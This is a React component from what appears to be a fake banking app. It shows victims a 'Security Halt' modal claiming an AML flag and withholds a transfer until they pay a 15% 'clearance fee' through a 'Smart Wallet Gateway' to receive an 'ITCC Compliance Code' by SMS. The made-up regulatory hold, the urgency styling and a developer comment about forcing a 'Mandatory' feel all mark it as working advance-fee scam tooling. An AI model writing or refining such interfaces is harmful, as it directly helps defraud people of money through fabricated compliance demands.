
import React, { useState } from 'react';
import { SpinnerIcon, XIcon, ScaleIcon, ShieldCheckIcon } from './Icons';
import { USER_PROFILE } from './constants';
import { Transaction, Account } from '../types';
import { SmartWalletPayment } from './SmartWalletPayment';
import { sendItccCodeViaTwilio } from '../utils/notificationService';

import { UserProfile } from '../types';

interface AuthorizationWarningModalProps {
    transaction: Transaction;
    onAuthorize: (transactionId: string, method: 'code' | 'fee') => void;
    onClose: () => void;
    onContactSupport: () => void;
    accounts: Account[];
    userProfile?: UserProfile;
}

export const AuthorizationWarningModal: React.FC<AuthorizationWarningModalProps> = ({ transaction, onAuthorize, onClose, onContactSupport, accounts, userProfile }) => {
    const [view, setView] = useState<'warning' | 'payment_gateway'>('warning');
    const [code, setCode] = useState('');
    const [error, setError] = useState('');
    const [isProcessing, setIsProcessing] = useState(false);
    const [requiredCode, setRequiredCode] = useState<string | null>(null); // State for dynamic code
    
    const clearanceFee = transaction.sendAmount * 0.15;

    const handleSubmitCode = () => {
        setError('');
        
        // Strict Validation: Code must match the one generated from payment
        if (!requiredCode) {
            setError('Clearance Code required. Please proceed to payment gateway to generate one.');
            return;
        }

        if (code.toUpperCase() !== requiredCode) {
            setError('Invalid clearance code. Please enter the code sent to your device.');
            return;
        }

        setIsProcessing(true);
        setTimeout(() => {
            onAuthorize(transaction.id, 'code');
        }, 1000);
    };
    
    const handlePayFeeClick = () => {
        setError('');
        setView('payment_gateway');
    };

    const handlePaymentSuccess = async (generatedCode: string) => {
        // Payment verified by sub-component, code generated.
        setRequiredCode(generatedCode);
        
        // Switch back to input view for user to enter the code they just received
        setView('warning'); 
        
        // Optional: Auto-fill for UX? Or force them to read the SMS?
        // Let's force them to read it to match "Mandatory" requirement feel.
    };

    return (
        <div className="fixed inset-0 bg-slate-50 dark:bg-[#030712]/95  flex items-center justify-center z-[70] p-4 animate-fade-in">
            <div 
                className="absolute inset-0 bg-cover bg-center bg-no-repeat opacity-10 dark:opacity-20"
                style={{ backgroundImage: `url('/src/assets/images/premium_banking_vault_blur_1781949708674.jpg')` }}
            ></div>
            <div className="absolute inset-0 bg-gradient-to-t from-slate-100 via-slate-100/90 dark:from-[#030712] dark:via-[#030712]/90 to-transparent pointer-events-none"></div>
            
            {view === 'warning' ? (
                <div className="bg-white dark:bg-slate-900  border border-red-500/20 dark:border-red-500/40 rounded-[2.5rem] shadow-2xl w-full max-w-lg overflow-hidden relative animate-fade-in-up z-10">
                    <div className="absolute top-0 left-0 right-0 h-1 bg-red-600 animate-pulse"></div>
                    
                    <button onClick={onClose} className="absolute top-6 right-6 p-2 text-[#0F172A] hover:text-[#0F172A] dark:text-white transition-colors">
                        <XIcon className="w-6 h-6" />
                    </button>
                    
                    <div className="p-10 text-center">
                        <div className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-500/20">
                            <ScaleIcon className="w-10 h-10 text-red-500" />
                        </div>
                        
                        <h2 className="text-3xl font-black text-[#0F172A] dark:text-white uppercase tracking-tight">Security Halt</h2>
                        <p className="text-red-400 font-bold text-xs uppercase tracking-widest mt-2">Regulatory Compliance Required</p>
                        
                        <div className="mt-8 text-left bg-red-950 border border-red-900/30 p-6 rounded-2xl">
                            <p className="text-[#0F172A] dark:text-white text-sm leading-relaxed mb-4 font-bold">
                                Transaction flagged by the <strong>AML Monitoring Node</strong>. An ITCC Compliance Code is mandatory to unlock the ledger.
                            </p>
                            <p className="text-[10px] text-[#0F172A] leading-relaxed uppercase tracking-wider">
                                System Restricted: Code generation occurs only after successful fee settlement.
                            </p>
                        </div>

                        <div className="mt-8">
                            <label className="block text-left text-[10px] font-black text-[#0F172A] uppercase tracking-widest mb-3 ml-1">Input Compliance Code</label>
                            <input 
                                type="text" 
                                value={code}
                                onChange={(e) => setCode(e.target.value.toUpperCase())}
                                className="w-full bg-slate-100 border border-slate-200 dark:border-slate-300 text-[#0F172A] dark:text-white p-5 rounded-2xl text-center tracking-[0.5em] font-mono text-lg focus:ring-2 focus:ring-red-500 focus:border-transparent outline-none shadow-inner"
                                placeholder="REL-..."
                                autoFocus
                            />
                            {error && <p className="mt-3 text-red-400 text-xs font-bold uppercase">{error}</p>}
                        </div>

                        <button 
                            onClick={handleSubmitCode}
                            disabled={isProcessing || code.length < 5}
                            className="w-full mt-6 py-4 bg-slate-100 hover:bg-white text-[#0F172A] font-black uppercase tracking-widest rounded-2xl shadow-xl flex items-center justify-center gap-3 transition-all disabled:opacity-30 dark:bg-slate-800"
                        >
                            {isProcessing ? <SpinnerIcon className="w-5 h-5 text-[#0F172A] animate-spin"/> : <ShieldCheckIcon className="w-5 h-5"/>}
                            {isProcessing ? 'Verifying...' : 'Verify & Release'}
                        </button>

                        {!requiredCode && (
                            <div className="mt-8 pt-6 border-t border-slate-200 dark:border-slate-700 flex flex-col gap-3">
                                <p className="text-[10px] text-[#0F172A] uppercase font-black tracking-widest">Action Required</p>
                                <button 
                                    onClick={handlePayFeeClick}
                                    className="text-sm font-bold text-red-400 hover:text-red-300 transition-colors animate-pulse"
                                >
                                    Proceed to Smart Wallet Gateway to Generate Code
                                </button>
                            </div>
                        )}
                    </div>
                </div>
            ) : (
                <div className="w-full max-w-md">
                    <SmartWalletPayment 
                        amount={clearanceFee}
                        onPaymentConfirmed={handlePaymentSuccess}
                        onBack={() => {
                            setError('');
                            setView('warning');
                        }}
                        userProfile={userProfile}
                    />
                </div>
            )}
        </div>
    );
};
